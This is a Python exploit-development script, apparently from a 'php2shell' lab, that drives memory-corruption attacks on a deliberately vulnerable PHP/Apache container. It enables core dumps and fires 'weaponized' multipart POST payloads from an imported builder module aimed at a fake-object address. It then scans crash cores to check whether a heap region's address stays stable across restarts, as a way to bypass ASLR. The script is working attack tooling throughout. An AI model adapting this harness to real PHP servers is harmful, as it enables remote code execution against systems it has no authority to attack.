#!/usr/bin/env python3
"""oom70: probe P-surface stability across boots.

Question: is the 128MB anon region (0x40209000 in boot A) at the same
address after a docker restart? If stable, P is known a priori and the
fake-object demo fires tonight with zero ASLR oracle work.
Method: boot B -> warm patterned -> sacrifice -> 1 weaponized fire ->
  if crash: si_addr (via cr2 if exposed / dmesg-style decode) + pattern
  offsets in fresh core -> compare with boot A's 0x40209000 + 136,880,160.
"""
import subprocess, sys, time
sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
TGT = 0x414141414141


def sh(c, t=60):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att, headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(200)
    except Exception as e:
        return "ERR", str(e)[:120].encode()


def wait_ready():
    for _ in range(30):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            return True
    return False


def core_scan(tag):
    """copy newest /tmp/core from php_vuln to phpbuild via HOST hop, scan."""
    subprocess.run("docker cp php_vuln:/tmp/core /tmp/core70 && "
                   "docker cp /tmp/core70 phpbuild:/tmp/core.70", shell=True,
                   capture_output=True)
    out = sh("docker exec phpbuild sh -c 'md5sum /tmp/core.70; "
             "grep -abo AAAAAAzz /tmp/core.70 | head -3; "
             "grep -c AAAAAAzz /tmp/core.70'", 120)
    print("[%s] core scan:\n%s" % (tag, out), flush=True)
    return out


print("[0] restart -> ready", flush=True)
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
assert wait_ready(), "server never came back"
md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
print("    md5:", md5, "(stock=ce1f3c48...)", flush=True)

print("[1] core env + keep cores", flush=True)
sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
sh("docker exec php_vuln sh -c 'rm -f /tmp/core*'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
assert wait_ready(), "server never came back after core env"

print("[2] warm patterned", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    code, _ = post(P.build_attack(k1, 8100000 + i * 100000, target_obj=TGT))
print("    warm done", flush=True)

print("[3] sacrifice + 2 weaponized finishers", flush=True)
for fi in range(3):
    code, body = post(P.build_attack(3400, 8200000 + fi * 100000, target_obj=TGT))
    print("  fire%d: %s %r" % (fi, code, body[:50]), flush=True)
    if code != "200":
        time.sleep(3)
        core_scan("fire%d" % fi)

print("[4] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
print("DONE: compare pattern offsets + md5 vs boot A (0x40209000 base, first hit @136,880,160)", flush=True)
